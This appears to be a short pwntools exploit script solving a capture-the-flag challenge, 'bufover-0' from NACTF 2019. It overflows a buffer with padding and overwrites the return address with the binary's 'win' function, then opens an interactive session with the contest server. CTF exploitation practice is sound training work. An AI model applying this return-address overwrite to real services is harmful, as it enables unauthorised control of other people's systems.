#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# context(log_level="debug", arch="i386", os="linux")
# p = process('./bufover-0')
p = remote('shell.2019.nactf.com', 31475)
elf = ELF('./bufover-0', checksec=False)
addr_win = elf.sym['win']

pd = 'a' * 0x1c
pd += p32(addr_win)
p.sendline(pd)

p.interactive()
